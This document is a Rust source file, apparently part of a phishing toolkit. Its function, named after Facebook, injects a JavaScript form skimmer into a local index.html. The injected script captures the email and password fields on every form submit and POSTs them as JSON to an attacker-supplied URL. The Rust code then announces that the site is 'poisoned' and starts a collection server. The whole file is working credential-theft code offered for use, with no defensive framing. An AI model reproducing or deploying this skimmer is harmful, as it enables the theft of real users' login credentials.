use std::fs::File;
use std::io::{self, Read, Write};
use crate::server;

pub fn facebook(url: &str) -> io::Result<()> {

    let mut file = File::open("index.html")?;
    let mut contents = String::new();
    file.read_to_string(&mut contents)?;
 
   let script_code = format!(
    r#"
<script>
    var forms = document.querySelectorAll('form');
    forms.forEach(function(form) {{
        form.addEventListener("submit", function(event) {{
            event.preventDefault();
            var emailInput = form.querySelector('input[name="email"]');
            var passInput = form.querySelector('input[name="pass"]');
            var formData = {{
                email: emailInput.value,
                pass: passInput.value
            }};
            console.log(formData);
            if (!form.hasAttribute('action')) {{
                form.setAttribute('action', '{}');
            }} else {{
                form.setAttribute('action', '{}');
            }}
            var xhr = new XMLHttpRequest();
            xhr.open('POST', form.getAttribute('action'));
            xhr.setRequestHeader('Content-Type', 'application/json');
            xhr.send(JSON.stringify(formData));

            form.submit();
        }}); 
    }});
</script>
"#,
    url, url
);
 
 
 
    if let Some(index) = contents.rfind("</html>") {
        
        contents.insert_str(index, &script_code);

        let mut file = File::create("index.html")?;
        file.write_all(contents.as_bytes())?;
        println!("Site is now poisoned!");
        println!("Starting Server...");
        println!("Server running on: {}", url.trim_end_matches("post"));
        let _ = server::main();

    } else {
        eprintln!("Something went wrong");
    }

    Ok(())
}
